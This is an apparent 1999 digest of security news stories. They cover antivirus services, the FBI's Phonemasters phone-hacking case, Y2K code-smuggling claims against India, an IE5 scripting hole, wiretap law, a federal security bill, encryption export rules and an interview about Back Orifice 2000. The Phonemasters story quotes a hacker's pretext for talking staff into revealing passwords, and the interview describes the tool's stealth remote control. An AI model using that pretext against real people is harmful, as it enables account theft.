      System." The technology automatically updates all subscribers over the Internet with virus
      recognition patterns whenever one of those computers encounters a new virus. 
      
      Fixes for a new virus can be disseminated to all the machines on the network within as little as 30
      minutes of encountering the first virus. The speed of the Internet, which viruses use to spread
      quickly, can now be used to get the cure out just as fast. 
      
      "As we distribute information faster and more broadly, we have to be careful," said Steve White,
      senior manager of IBM's Massively Distributed Systems Research Division, who helped design
      the new Digital Immune System service. "It becomes much easier to get viruses over the Internet." 
      
      Firewall for the home
      Symantec is also preparing to package its anti-virus software into a single integrated security suite
      that will give home users a firewall, Internet filtering software and anti-virus utilities, said Symantec
      engineers at the show. The product will be released later this month. 
      
      But even that stand-alone product will eventually be connected to the Digital Immune System
      service, providing virus updates extremely quickly. 
      
      "The whole industry is going toward automatic fixes and automatic updates," said IBM's White.
      "The anti-virus vendors are just adopting it faster."
      
      Symantec's rivals are working on similar strategies. "A lot of the basis of value of a stand-alone
      product in the home is going away," said Crag Kensek, director of product marketing for
      anti-virus firm Trend Micro Inc. "For the non-technical home user, it's like insurance." 
      
      Trend announced in September its new eDoctor strategy, which allows ISPs to protect their
      customers from viruses by scanning each file downloaded from the Internet. U S West
      (NYSE:USW) and Sprint Communications Corp. (NYSE:FON) have signed on to the service. 
      
      Virus reporting valuable
      Rival security software firm Network Associates Inc. (Nasdaq:NETA) plans to release a similar
      technology to Symantec's called the AutoImmune System, early next year, its engineers said. 
      
      While finding and fixing viruses faster has captured the interest of corporate network
      administrators, an automated system's ability to collect data on the number of virus incidents is
      equally valuable, said one administrator at the conference, who asked to remain anonymous. 
      
      Currently, the best source of such data is the Wildlist, and even that volunteer site would like to
      see better and more accurate statistics, said Sarah Gordon, one of the directors of the
      independently maintained Wildlist.
      
      "It would be extremely useful to get reports from these systems," she said. "We intend to pursue
      that in the future."

      Unplugged! The biggest hack in history
      By John Simons, WSJ Interactive Edition
      October 1, 1999 8:54 AM PT
      URL: http://www.newslinx.com/
      
      DALLAS -- In a federal courtroom here, Calvin Cantrell stands silently, broad shoulders
      slouched. His lawyer reads from a short letter he has written: 
      
      "My parents taught me good ethics, but I have departed from some of these, lost my way
      sometimes," the letter states. "I was 25 and living at home. No job, and no future... . All I ever
      really wanted was to work with computers." 
      
      Cantrell certainly did work with computers -- both his own, and, surreptitiously, those of some of
      the largest companies in the world. He was part of a ring of hackers that pleaded guilty here to the
      most extensive illegal breach of the nation's telecommunications infrastructure in high-tech history. 
      
      And sitting behind him in court as he was sentenced two weeks ago was the
      accountant-turned-detective who caught him: Michael Morris. A decade earlier, Morris, bored
      with accounting work, left a $96,000 job at Price Waterhouse and enrolled in the FBI academy,
      at $24,500 a year. Cantrell's sentencing was the final act in a five-year drama for Morris, and
      secured his reputation as the FBI's leading computer gumshoe. 
      
      The tale of Morris and Cantrell is among the first cops-and-robber stories of the New Economy,
      involving, among other things, the first-ever use of an FBI "data tap." It illustrates how the nation's
      law-enforcement agencies are scrambling to reinvent their profession in a frantic effort to keep
      pace with brilliant and restless young hackers. 
      
      Unlimited potential for harm
      The story also shows that hacking's potential harm is far more ominous than theft of telephone
      credit-card numbers. Cantrell was part of an eleven-member group dubbed "The Phonemasters"
      by the FBI. They were all technically adept twentysomethings expert at manipulating computers
      that route telephone calls. 
      
      The hackers had gained access to telephone networks of companies including AT&T Corp.,
      British Telecommunications Inc., GTE Corp., MCI WorldCom (then MCI Communications
      Corp.), Southwestern Bell, and Sprint Corp. They broke into credit-reporting databases
      belonging to Equifax Inc. and TRW Inc. They entered Nexis/Lexis databases and systems of Dun
      & Bradstreet, court records show. 
      
      The breadth of their monkey-wrenching was staggering; at various times, they could eavesdrop on
      phone calls, compromise secure databases, and redirect communications at will. They had access
      to portions of the national power grid, air-traffic-control systems and had hacked their way into a
      digital cache of unpublished telephone numbers at the White House. The FBI alleges, in evidence
      filed in U.S. District Court for the Northern District of Texas, that the Phonemasters had even
      conspired to break into the FBI's own National Crime Information Center. 
      
      Unlike less-polished hackers, they often worked in stealth, and avoided bragging about their
      exploits. Their ultimate goal was not just fun, but profit. Some of the young men, says the FBI,
      were in the business of selling the credit reports, criminal records, and other data they pilfered
      from databases. Their customers included private investigators, so-called information brokers and
      -- by way of middlemen -- the Sicilian Mafia. According to FBI estimates, the gang accounted for
      about $1.85 million in business losses. 
      
      "They could have -- temporarily at least -- crippled the national phone network. What scares me
      the most is that these guys, if they had had a handler, whether criminal or state-sponsored, could
      have done a lot of damage," says Morris. "They must have felt like cyber gods." 
      
      Some may be still at large
      With the exception of Cantrell, none of the defendants in the Phonemasters case would comment
      on the matter. Others are thought to remain at large. This is the story of Cantrell and two
      accomplices largely put together from federal district court records and FBI interviews. Morris
      first learned of the group in August 1994, when he got a phone call from a Dallas private
      investigator, saying Cantrell had offered to sell him personal data on anyone he wished. He even
      offered a price list: Personal credit reports were $75; state motor-vehicle records, $25; records
      from the FBI's Crime Information Center, $100. On the menu for $500: the address or phone
      number of any "celebrity/important person." 
      
      Morris immediately opened an investigation. Only 33-years-old at the time, he had taken an
      annual pay cut to join the FBI just five years earlier. He had been a tax consultant at Price
      Waterhouse, and despised the work. "I was young and making the big bucks, but every morning I
      would think 'God, I don't want to go to work.' " 
      
      Tall, square-jawed and mustachioed, Morris began working on white-collar crimes when he
      arrived at the Dallas FBI field office. He took on a few hacker cases and realized he liked the
      challenge. "These guys are not the kind who'll rob the convenience store then stare right into the
      security camera," he says. "Trying to be the Sherlock Holmes of the Internet is hard when the
      fingerprints on the window can be so easily erased." 
      
      Morris convinced the private investigator to meet with Cantrell while wearing an audio taping
      device. After reviewing the tapes, he was certain that he was onto something big. He applied for
      and received court authority to place a digital number recorder on Cantrell's phone lines, which
      would log numbers of all outgoing calls. It showed that Cantrell frequently dialed corporate
      telephone numbers for AT&T, GTE, MCI, Southwestern Bell and Sprint. Cantrell had also placed
      calls to two unlisted numbers at the White House, which further piqued Morris's interest. 
      
      So, late that summer, Morris took an unprecedented step. He began writing a 40-page letter to
      the FBI's Washington headquarters, the Department of Justice and the federal district court in
      Dallas. Recording Cantrell -- now his central suspect -- while on the phone wasn't sufficient for
      the job that faced him, he believed. Instead, he needed new federal powers. He asked for
      Washington's permission to intercept the impulses that traveled along Cantrell's phone line as he
      was using his computer and modem. 
      
      "It's one of the hardest techniques to get approved, partly because it's so intrusive," says Morris,
      who spent the next month or so consulting with federal authorities. "The public citizen in me
      appreciates that," he says. Still, the long wait was frustrating. "It took a lot of educating federal
      attorneys," he says. 
      
      Once authorities said yes, Morris faced another obstacle: The equipment he needed didn't exist
      within the FBI. Federal investigators had experimented with a so-called data-intercept device only
      once before in a New York hacker case a year earlier. It had failed miserably. 
      
      Morris and technicians at the FBI's engineering lab in Quantico, Va., worked together to draft the
      specifications for the device Morris wanted. It would need to do the reverse of what a computer's
      modem does. A modem takes digital data from a computer and translates it to analog signals that
      can be sent via phone lines. Morris's device would intercept the analog signals on Cantrell's phone
      line and convert those impulses back to digital signals so the FBI's computers could capture and
      record each of a suspect's keystrokes. 
      
      Alerting the victims
      While waiting for the FBI to fit him with the proper gear, Morris contacted several of the
      telephone companies to alert them that they had been victimized. The reception he got wasn't
      always warm. "It's kind of sad. Some of the companies, when you told them they'd had an
      intrusion, would actually argue with you," he said. 
      
      GTE was an exception. Morris discovered that Bill Oswald, a GTE corporate investigator, had
      opened his own Phonemasters probe. Oswald and Morris began working together and uncovered
      another of Cantrell's schemes: He and some friends had managed to get their hands on some
      telephone numbers for FBI field offices. They entered the telephone system and forwarded some
      of those FBI telephones to phone-sex chat lines in Germany, Moldavia and Hong Kong. As a
      result of the prank, the FBI was billed for about $200,000 in illegal calls. 
      
      Morris also learned that on Oct. 11, 1994, Cantrell hacked GTE's computer telephone "switch" in
      Monticeto, Calif., created a fake telephone number and forwarded calls for that number to a
      sex-chat line in Germany. The FBI isn't sure how Cantrell convinced people to call the number,
      but court records show that Cantrell received a payment of $2,200 from someone in Germany in
      exchange for generating call traffic to the phone-sex service. 
      
      In early December 1994, Morris's "analog data-intercept device" finally arrived from the FBI's
      engineering department. It was a $70,000 prototype that Morris calls "the magic box." 
      
      On Dec. 20, Morris and other agents opened up their surveillance in an unheated warehouse with
      a leaky roof. The location was ideal because it sat between Cantrell's home and the nearest
      telephone central office. Morris and nine other agents took turns overseeing the wiretap and data
      intercepts. The agents often had to pull a tarp over their workspace to keep rain from damaging
      the costly equipment.As middle-class families go, the Cantrells seem exemplary. Calvin's father,
      Roy, was a retired detective who had once been voted "Policeman of the Year" in Grand Prairie,
      the suburb west of Dallas where they live. His mother, Carol, taught Latin and English at Grand
      Prairie High School, where Calvin graduated in 1987 with above-average grades.
      
      As a student, he was no recluse. He had a small circle of friends who shared
      his love of martial arts, video games and spy movies. Cantrell's longtime
      friend, Brandon McWhorter, says Calvin was always a fun-loving guy, but
      there was one thing about which he was very serious. 
      
      "He would always talk to me about religion," McWhorter says. "He held very
      strong religious beliefs." 
      
      After high school, Cantrell continued to live at home while taking classes at the University of Texas
      at Arlington and a local community college. 
      
      He held a series of odd jobs and hired himself out as a deejay for weddings and corporate parties.
      Cantrell balanced, school, work, family and friends even as he began hacking more often. His
      parents became suspicious, but said nothing. The family had three phones; Calvin stayed on his 15
      hours a day. 
      
      "They'd go in my room and see all the notes and the phone numbers. Even though they couldn't
      put it together technically, they knew something was up," says Cantrell. "They were kind of in
      denial... . My parents were pretty soft." 
      
      Mrs. Cantrell says Calvin had been so well-behaved that she never suspected his computer
      activities were more than fun and games. "I wish I had known what was going on. Unfortunately,
      my son was smarter than I was." (Calvin's father passed away last year.) 
      
      The hack
      At 8:45 on the night of Dec. 21, just four days before Christmas, Cantrell went online. Using an
      ill-gotten password, he entered a Sprint computer, where he raided a database, copying more
      than 850 calling-card access codes and other files, court records in the case show.
      
      The Phonemasters often got passwords and other key information on companies in a low-tech
      approach called "Dumpster diving," raiding the trash bins of area phone firms for old technical
      manuals, phone directories and other company papers. This often allowed Cantrell to run one of
      his favorite ruses -- passing himself off as a company insider. 
      
      "I'd call up and say, 'Hi, I'm Bill Edwards with systems administration.' ... I'd chat with them for a
      while, then I'd say 'We're doing some network checkups today. Can you log off of your
      computer, then tell me every character you're typing as you log back on?' A lot of people fell for
      that," Cantrell says. 
      
                      After hacking into the Sprint database that evening, Cantrell talked to another
                      hacker, Corey Lindsley, over the phone. He'd "met" Lindsley, and another
                      hacker, John Bosanac, in 1993 while surfing the murky world of hacker
                      bulletin boards. Cantrell then sent the copied files to Lindsley, who was a
                      student at the University of Pennsylvania in Philadelphia. 
      
                      Morris's equipment captured everything -- voice and data. It was an FBI
                      first. "We're sitting in this place that looked liked a bomb pit, but the
                      atmosphere was really exciting," says Morris. "We were ecstatic." 
      
                      As the days passed, the FBI wiretap generated stacks upon stacks of
                      audiotapes and data transcripts. Some was just idle talk among friends, the
                      occasional call to finalize dinner plans, lots of workaday chatter. But the
                      incriminating evidence mounted. "It's great, you know. I really love fraud,"
      joked Bosanac, a Californian who was musing with Cantrell about the various technical methods
      of using other people's cellular telephone accounts to place free calls. "Fraud is a beautiful thing." 
      
      Family conversations even entered the investigation. On Jan. 7, for instance, Cantrell called his
      mother from a friend's house and asked her find an MCI manual on his shelf. He then asked her to
      read him a set of directions for accessing MCI's V-NET computer system. Mrs. Cantrell read the
      material but asked her son whether he was supposed to have the book, citing warnings that stated
      its contents were restricted to MCI employees. Cantrell just avoided his mother's question. The
      FBI data-tap captured every word. 
      
      Taking a toll
      Still, the process took its toll on the FBI team, especially coming during the holidays. "It was
      stressful that the wiretap was going 24 hours a day, seven days a week. I had to write up the legal
      documents, and it's tough making people work through Christmas," Morris said. On top of that, he
      had to keep records of his findings, and every 10 days he had to reapply to the court to prove that
      his wiretap was yielding evidence. 
      
      By late January, the FBI had begun to get a clear profile of Cantrell and his hacker friends.
      Lindsley, it appeared, was the group's acerbic leader, directing much of the hacking activity. Over
      phone lines, the FBI heard him bragging about how he had given a Pennsylvania police department
      "the pager treatment" in retaliation for a speeding ticket he received. Lindsley had caused the
      police department's telephone number to appear on thousands of pagers across the country. The
      resulting flood of incoming calls, Lindsley bragged, would surely crash the department's phone
      system. 
      
      They also enjoyed collecting information about film stars, musicians and other famous people.
      Cantrell has admitted that he broke into President Clinton's mother's telephone billing records in
      Arkansas to obtain a list of unpublished White House numbers. The men, says the FBI, even
      made harassing phone calls to rock star Courtney Love and former child actor Danny Bonaduce
      using pilfered numbers. 
      
      They weren't without fear of getting caught. On the evening of Jan. 17, for instance, there was a
      clicking on the phone line as Bosanac, Cantrell, and Lindsley shared a three-way conference call.
      "What the hell happened?" asked Bosanac, according to an FBI transcript of the conversation. 
      
      "That was the FBI tapping in," laughed Cantrell. 
      
      "Do you know how ironic that's gonna be when they play those tapes in court?" Lindsley said.
      "When they play that tape in court and they got you saying it was the FBI tapping in?"On Jan. 18,
      the FBI overheard Cantrell, Bosanac and Lindsley on another conference call. With the other two
      men giving directions, Cantrell dialed his computer into Southwestern Bell's network and copied a
      database of unlisted phone numbers. The three men then discussed plans to write a computer
      program that could automatically download access codes and calling-card numbers from various
      telephone systems. They also talked about the chance that the FBI would one day track them
      down. 
      
      "Just remember, nobody f-- rats anybody out," said Lindsley to the others. "No deals." 
      
      "Yeah, no deals is right," replied Bosanac. 
      
      "No deals. I'm serious. I don't care what your f-- lawyers tell you," said Lindsley. 
      
      Cantrell said nothing. 
      
      Transferred codes to Canada
      Later that morning, between 5:09 and 7:36, Cantrell entered Sprint's computer system and
      downloaded about 850 Sprint calling-card codes. He then transferred those codes to a man in
      Canada. The codes would allow anyone who purchased them to place free international phone
      calls. Morris would later learn that a contact in Canada paid Cantrell $2 apiece for each code,
      court records show. The Phonemasters most likely did not know -- or care -- where the codes
      ended up, but the FBI traced them and found some ended up in the hands of a Sicilian Mafia
      operative in Switzerland.
      
      On Jan. 23, while probing a U S West telephone database, Cantrell, Bosanac, Lindsley and
      others stumbled over a list of telephone lines that were being monitored by law enforcement. On a
      lark, they decided to call one of the people -- a suspected drug dealer, says Morris -- and let him
      know his pager was being traced by the police. 
      
      On Jan. 27, the group was clearly feeling paranoia about being caught, prompting Lindsley to tell
      his accomplices to pull as many Sprint codes as quickly as they could. Cantrell began to have
      reservations. 
      
      "What if I stopped before all of y'all?" Cantrell asked Lindsley. "Would you applaud my efforts?" 
      
      "No," said Lindsley. "I don't think there's any reason to stop. What are you worried about?" 
      
      "Uh, I'm not worried about anything. I'm just saying, uhm. There might ... there might come a time
      here where I don't have time for this." 
      
      He added a little later: "I, you know, really like it. But, I don't know, I just ... Eventually, I don't
      see myself doing a lot of illegal things." 
      
      Lindsley continued to prod Cantrell to speed up the download of stolen codes by spending more
      time online and using two phones. 
      
      "I'm telling you, you run two lines around the clock," Lindsley said. 
      
      "You can't run them around the clock," said Cantrell. 
      
      "Why not?" 
      
      "Oh, come on. I think that's pushing it too hard." 
      
      "I think you just got a weak stomach there, boy." 
      
      Tension rises
      By late February, things began to get tense. One of Cantrell's hacker friends informed him that his
      number had shown up in a database of phone numbers being monitored by the FBI. In all the
      excitement of burglarizing databases and rerouting phone calls, the Phonemasters had neglected to
      check their own phone lines for any signs that law enforcement might be listening in. 
      
      Morris hastily arranged for an FBI raid. On Feb. 22, 1995, agents raided
      Cantrell's home, Lindsley's college dorm room, and burst into Bosanac's
      bedroom in San Diego. 
      
      For Morris, the climactic raid was only the start of a long battle to bring the
      hackers to justice. Because of the complicated nature of his evidence
      gathering, it took him more than two years to compile the most salient
      portions of the wiretap transcripts and data-tap evidence. "All the documents
      and tapes from this case could fill a 20-by-20 room," Morris explains. "And
      at the time, I was the only computer investigator for all of Texas." 
      
      In the meantime, as federal prosecutors slowly geared up for a trial, Cantrell
      tried to get on with his life. "I spent the first few weeks after the raid being
      paranoid and wondering what would happen," he says. Occasionally, Morris and other agents
      would call him, asking questions about some of the systems he had hacked. By the summer of
      1995, at the urging of his mother, Cantrell started attending church again. He scored the first in a
      string of professional computing jobs, doing systems-administration work for a company called
      Lee Datamail in Dallas. He neglected to tell his employers about the FBI case. "It's been mental
      torture for the last four years, not knowing," says Cantrell. "Can I go to school, move to another
      state? That kind of thing messes with your head." 
      
      Over time, Cantrell says he had come to seriously regret what he had done and the $9,000 he
      says he made from selling codes wasn't worth the trouble. "Looking back, it was all crazy. It was
      an obsession. I wanted to see how much I could conquer and a little power went to my head."
      Cantrell notes that he has since tried to make amends, even helping the phone companies plug
      their security holes and helping the FBI gather more information on some of the group's members
      who haven't yet been apprehended. 
      
      The matter finally seemed near conclusion this March when Morris was able to play "a couple of
      choice tapes" in separate meetings with Cantrell, Bosanac and Lindsley. Afterward, all three
      agreed to plea guilty to federal charges of one count of theft and possession of unauthorized
      calling-card numbers and one count of unauthorized access to computer systems. Chief Judge
      Jerry Buchmeyer ordered a presentencing investigation. 
      
      During a hearing on the matter, Lindsley's attorney tried to argue that the FBI had wildly
      overstated the $1.85 million in losses that her client's hacking had allegedly caused. But in the end,
      Judge Buchmeyer rejected the argument and sentenced him to 41 months in prison. Bosanac, in
      the meantime, has asked that his sentencing hearing be moved to San Diego, where he lives. 
      
      As for Cantrell, Judge Buchmeyer lauded his "acceptance of guilt." He could have been sentenced
      to three years in federal prison; instead he was given two. He reports to federal prison in January
      of next year. 
      
      Morris, meanwhile, has used his data-tap method in several other cases; he also travels around the
      country and the world advising law-enforcement agencies on how to conduct state-of-the-art
      investigations of hacker crimes.

52.0  INDIA RESPONDS TO Y2K ACCUSATIONS

      Indian firms have done more than $2 billion worth of coding work to protect old
      computers from the Y2K problem, but accusations are made by some that India and
      Israel appear to be the "most likely sources" of malicious code. Indian officials
      yesterday reacted to these claims speaking of it as a ridiculous suggestion. Indian

      India: Code-Smuggling? Absurd
      Reuters 
      
      11:45 a.m.  1.Oct.99.PDT
      Indian officials Friday slammed as ridiculous a suggestion by US officials that Indian Y2K (Year 2000) software firms could have been used to
      smuggle in computer codes aimed at threatening Washington's security. 
      
      Michael Vatis, the top cyber cop in the Federal Bureau of Investigation, told Reuters Thursday that malicious code changes under the guise of Y2K
      modifications had begun to surface in some US work undertaken by foreign contractors. 
      
      The claim signaled possible economic and security threats. 
      
      Vatis, who heads the National Infrastructure Protection Center (NIPC), gave no details. But Terrill Maynard, a Central Intelligence Agency officer
      assigned to the NIPC, said in a recent article that India and Israel appeared to be the "most likely sources" of malicious code. 
      
      The article appeared in the June issue of Infrastructure Protection Digest. 
      
      "I think this is an utterly ridiculous assertion ... without, as far as I can see, any basis whatsoever," said Montek Singh Ahluwalia, chairman of the
      Indian government's Y2K Action Force. 
      
      "I have no idea if this report is factually correct and if indeed a responsible officer has made what appears to be an irresponsible statement,"
      Ahluwalia told Reuters. 
      
      He said the Indian government had not received any official communication to suggest wrongdoing by Indian firms or agencies. 
      
      The CIA declined to comment on Maynard's article. Referring to it, Vatis said: "This is our effort to put out in the public information that hopefully
      can be useful to people." 
      
      Indian firms have done more than $2 billion worth of coding work to protect old computers whose date-fields denoted years only by the last two
      digits. Unless rectified, such computers can cause valuable data crashes when the year 2000 dawns. 
      
      India and Israel have had differences with the United States on security matters, particularly on nuclear policy. 
      
      Dewang Mehta, president of India's National Association of Software and Service Companies (NASSCOM), cited several reasons to dismiss
      suggestions Indian firms may be a security threat. 
      
      He told Reuters that too much was at stake for India's booming software companies, which have used Y2K as a strategy to gain long-term clients.
      Besides, Indian firms did the bulk of Y2K work at US sites under client supervision, he added. 
      
      "We cannot visualize that any moles have been planted. This is absurd. For us, too much is at stake," Mehta said. 
      
      He said Indian firms had also carried out "regression testing," which was aimed at ensuring Y2K programming work did not hamper other software in
      client systems. 
      
      Vatis said it was "quite easy" for an outsider to code in ways of gaining future access or causing something to "detonate" down the road. 
      
      This could expose a company to future "denial of service attacks," open it to economic espionage, or leave it vulnerable to malicious altering of
      data, he said. 
      
      Vatis said that so far "not a great deal" of Y2K-related tampering had turned up. But a US Senate panel said last week that long-term
      consequences of using foreign firms for Y2K work could include more espionage and reduced information security. 
      
      Mehta said he heard during a recent visit to Israel a rumor about a computer virus designed to wipe out Y2K solutions. 
      
      "I am afraid as only three months are left and many American systems are not compliant, this kind of global rumor-mongering is beginning to
      happen," he said. We all think we should guard ourselves against it. NASSCOM strongly condemns such rumors." 
      
      Maynard noted Ireland, Pakistan, and the Philippines among nations whose firms did significant Y2K repair. He said they were "least likely" to harm
      US systems but did not rule out threat possibilities.

      O swell, here's another Internet Explorer hole for you. The latest problem can occur

      IE 5.0 security hole exposed
      By Peter Deegan, Help Channel
      September 30, 1999 8:02 AM PT
      URL: http://www.newslinx.com/
      
      Every time you look there's another security breach found in Microsoft Internet Explorer 5.0. Like
      many of these problems there are no reports of it being used maliciously yet, but now that the
      details are out, the chances of someone making use of the information grows. 
      
      This latest problem can occur through what appears to be a download file link on a Web page,
      newsgroup message or HTML e-mail message. The bogus download link can open a path to your
      computer, through which it's possible to read files on your computer. You don't need to click on
      the link to be affected because it possible to automatically activate the link when you view the
      Web page or e-mail message. 
      
      The problem is in the Active Scripting component of Microsoft (Nasdaq:MSFT) Internet Explorer
      5. Working behind a corporate firewall or proxy is no protection from this security hole. 
      
      What can you do about it?
      There's no patch available for the problem, though Microsoft has issued a security alert and is
      working on the problem now. In the meantime you can protect yourself by switching off the Active
      Scripting component. In Internet Explorer 5, select Tools | Internet Options, then click on the
      Security tab. Select the Internet Zone, then click on the "Custom Level" button. Scroll down to the
      "Scripting" heading, find the "Active Scripting" entry and change it to "Disable." Click OK. 
      
                          Keep in mind, this temporary fix may do you more harm than good.
                          Scripting is used by many Web sites, and it's possible that some service
                          on a Web page won't work once you turn scripting off. The best
      example of this is the Windows Update option in IE5 itself; this is the easiest way to update the
      browser with security patches and other new features. So if you turn off Scripting in IE5 you won't
      be able to use the Windows option to get the update to fix Scripting. Catch 22! 
      
      You could change the Scripting setting to "Prompt," which means you'll get a warning when you go
      to a Web page that has a scripting component. The problem with this is that the prompt gives you
      no indication of what the scripting will do so you're asked to make a decision with no information. 
      
      While the risk in the short term of this problem is relatively low, you can switch off scripting if
      you're concerned -- but keep in mind the consequences. Remember to turn scripting back on
      when using Tools | Windows Update to check for an update. Let's hope the security patch for this
      problem arrives soon.

      Telecom industry decries digital wiretap deadline

      WASHINGTON ù Key members of the U.S. telecommunications industry complained this week that a
      government deadline for compliance with a new digital wiretapping law is "unrealistic."

      While praising the Federal Communications Commission (FCC) for finally issuing guidelines to implement the
      controversial wiretap law ù the Communications Assistance for Law Enforcement Act (Calea) ù a trade group
      here charged with developing standards said a Sept. 30, 2001, deadline for compliance is too soon. 

      Matthew Flanigan, president of the Telecommunications Industry Association (TIA), warned that "Calea
      compliance involves one of the most complicated sets of features ever developed by manufacturers." The FCC
      decision "will only add to the complexity and difficulty," he said. 

      To comply, Flanigan said, manufacturers must develop software interfaces for hundreds of network elements
      without bringing down telecom networks. 

      In issuing its final order earlier this week, the FCC designated the industry group as the standards-setting body
      for converting myriad legal decisions about the wiretap law into technical standards needed by manufacturers to
      comply with the 1994 law.

     Fed Computer Security Bill Has Strong Support 
     
     By David McGuire, Newsbytes
     WASHINGTON, DC, U.S.A., 
     30 Sep 1999, 3:56 PM CST

     A house bill aimed at beefing up computer security in civilian federal agencies received a broad
     endorsement from government and high-tech industry leaders today. 

     Not only would H.R. 2413, The Computer Security Enhancement Act of 1999, provide much needed security guidance to
     non-military federal agencies, it could help beef-up private-sector computer security by providing the public with a list of
     government-approved security devices, National Institute of Standards and Technology (NIST) Director Raymond Kammer
     said today. 

     Kammer spoke at a hearing on H.R. 2413 held by the House Science Committee's Subcommittee on Technology. 

     The legislation appears to have strong support in the Subcommittee. 

     "Despite the money, manpower and management priority we've exerted on the Y2K problem, I believe a lack of adequate
     computer security protection in our federal agencies has the potential to dwarf the millennium bug in scope and magnitude,"
     Subcommittee Chairwoman Constance Morella, R-Md., said in prepared remarks today. 

     Among other things, H.R. 2413 would require NIST to serve as a computer security consultant for other federal agencies. In
     that role NIST would advise agencies on what "off-the-shelf" computer security products met with the government's approval.

     NIST would provide that list of approved products to the public as well. 

     The bill also requires the Under Secretary of Commerce to establish a "clearinghouse of information" on computer security
     threats and to make that list available to the public. 

     If passed, the bill will "get civilian agencies to pay more attention to information security," said Information Technology
     Association of America President Harris Miller after today's hearing. 

     In addition to its computer security provisions, the bill also establishes a new, NIST-administered computer science
     fellowship program for students studying computer security.

      Justice Dept. Funds
      Antihacking Campaign 

      By Keith Perine 

      WASHINGTON û The Justice Department is
      trying to save children before they turn into
      hackers. 

      With its $300,000 funding of the
      Cybercitizen Partnership, an awareness
      campaign coordinated by the Information
      Technology Association of America, the
      Justice Department assumes the unusual role
      of helping to educate budding Web users
      about how to be responsible, law-abiding
      surfers. 

      The Cybercitizen Partnership, announced in
      March, is a joint Justice-ITAA effort aimed
      at protecting the country's Internet
      infrastructure from outlaw hackers and other
      criminals. Faced with a security breach, law
      enforcement officials don't know at first if
      they're confronting a foreign terrorist, a
      college student or a couple of sixth-graders
      who are having some fun with Dad's
      computer. But an ITAA official said that,
      upon investigation, a surprising number of
      cases involve child hackers. 

      The association says that information
      technology makes up about 6 percent of the
      global gross domestic product û some $1.8
      trillion of electronic infrastructure that needs
      to be protected against disgruntled former
      employees, corporate spies and juvenile
      delinquents who like to pull pranks. 

      Figuring that it's too late to reform terrorists
      and spies, the ITAA decided to concentrate
      on the kids. The campaign, which debuts in
      January, will initially target children 12 and
      under, aiming to teach them proper online
      behavior and to instill a healthy disdain for
      hacking. The association wants to "help
      weed out some of the less meaningful
      system violations by curious children so that
      law enforcement can focus on the true
      criminals," says ITAA President Harris Miller. 

      The cash infusion from the Justice
      Department is in keeping with a long
      tradition of government-sponsored public
      education campaigns, from the Interior
      Department's Smokey the Bear messages
      against forest fires to the Drug Enforcement
      Administration's "Just Say No" war on drugs. 

      Miller says the campaign could be expanded
      to educate kids about other aspects of
      proper Internet etiquette, such as warning
      them against sending spam û for kids, the
      modern-day equivalent of prank telephone
      calls û or visiting Web sites with adult
      content. The main focus of the campaign,
      however, will be to "send the message that
      hacking isn't cute, clever or funny." In
      addition to the funding from Justice, the
      ITAA also plans to pass the hat among its
      own membership, a who's-who list of the
      high-tech industry that includes Microsoft
      (MSFT) , America Online (AOL) and IBM
      (IBM) . The association will also seek funds
      from foundations and possibly from private
      individuals. 

      The association has sent out a request to
      several public relations companies for ideas
      on how to run the campaign, which might
      include television and Internet advertising,
      brochures and even visits to schools. One
      possibility under consideration: the creation
      of a mascot, like the famous McGruff crime dog, to pass the message
      along in a friendly manner.

      SAN FRANCISCO--A U.S. federal appeals court will reexamine a trial court's decision to lift U.S. government
      restrictions on the export of encryption technology.
 
      The 9th U.S. Circuit Court of Appeals withdrew a May decision by a panel of three of its judges, which had endorsed the trial court
      ruling. That indicates that a majority of the active 9th Circuit judges have reservations about the opinion or feel the encryption
      issue is significant enough to be revisited.
 
      In May, the panel of 9th Circuit judges concluded that the federal government could not limit professor Daniel J. Bernstein's efforts
      to distribute encryption software.
 
      Many companies, such as Network Associates, have been prevented by U.S. law from selling data-scrambling technology
      overseas.
 
      Earlier this month, it was reported that the Clinton administration is easing restrictions on data-scrambling technology, clearing
      the way for Network Associates and other companies to sell the hardest-to-crack encryption technology.

      Don't blame Back Orifice for
      security problems 

      September 29, 1999
      Web posted at: 10:50 a.m. EDT (1450 GMT)

      by Ann Harrison 

      (IDG) -- BackOrifice is a remote
      administration tool for Microsoft
      Windows and, as Bruce Schneier, chief
      technology officer at San Jose-based
      managed security services firm
      Counterpane Internet Security Inc. (link
      below), points out, "one of the coolest
      hacking tools ever developed." 

      Computerworld reporter Ann Harrison spoke with him recently about the tool,
      which he insists has gotten an undeservedly bad reputation. 

      Back Orifice 2000 (BO2K) is free, open source and available at
      www.bo2k.com (link below). 

      Q: How does BO2K work? 

      A: There are two parts: a client and a server. The server is installed on the
      target machine. The client, residing on another machine anywhere on the
      Internet, can now take control of the server. 

      This is actually a legitimate requirement.
      Perfectly respectable programs, like
      pcAnywhere or Microsoft Systems
      Management Server [SMS], do the same
      thing. They allow a network administrator to
      remotely troubleshoot a computer. If the
      server is installed on a computer without the
      knowledge or consent of its owner, the client
      can effectively "own" the victim's PC. 

      Q: Why has BO2K acquired a reputation
      as only a hacker's tool? 

      A: Back Orifice's difference is primarily
      marketing spin. Since it was written by
      hackers, it is evil. 

      That's wrong; pcAnywhere is just as much
      an evil hacking tool as Back Orifice. 

      Not only can the client perform normal
      administration functions on the server's
      computer -- upload and download files, delete files, run programs, change
      configurations, take control of the keyboard and mouse, see whatever is on the
      server's screen -- but it can also do more subversive things: reboot the
      computer, display arbitrary dialog boxes, turn the microphone or camera on
      and off, capture keystrokes and passwords. And there is an extensible plug-in
      language for others to write modules. 

      Q: How does BO2K run in stealth mode? 

      A: Unless the server's owner is knowledgeable (and suspicious), he will never
      know that Back Orifice is running on his computer. 

      Other remote administration tools, even SMS, also have stealth modes. Back
      Orifice is just better at it. 

      Because Back Orifice is configurable, because it can be downloaded in source
      form and then recompiled to look different... I doubt that all variants will ever
      be discovered. 

      BO2K's slogan is "show some control," and many will take that imperative
      seriously. Back Orifice will be used by lots of unethical people to do all sorts
      of unethical things. And that's not good. 

      Q: Back Orifice can't do anything until the server portion is installed
      on some victim's computer, right? 

      A: Yes. This means that the victim has to commit a security faux pas before
      anything else can happen. Not that this is very hard -- lots of people network
      their computers to the Internet without adequate protection. 

      Still, if the victim is sufficiently vigilant, he can never be attacked by Back
      Orifice. 

      Q: What about Microsoft? 

      A: One of the reasons Back Orifice is so nasty is that Microsoft doesn't
      design its operating systems to be secure. It never has. 

      In Unix, an attacker would first have to get root privileges. Not in Windows.
      There's no such thing as limited privileges or administrator privileges or root
      privileges. This might have made some sense in the age of isolated desktop
      computers. But on the Internet, this is absurd. 

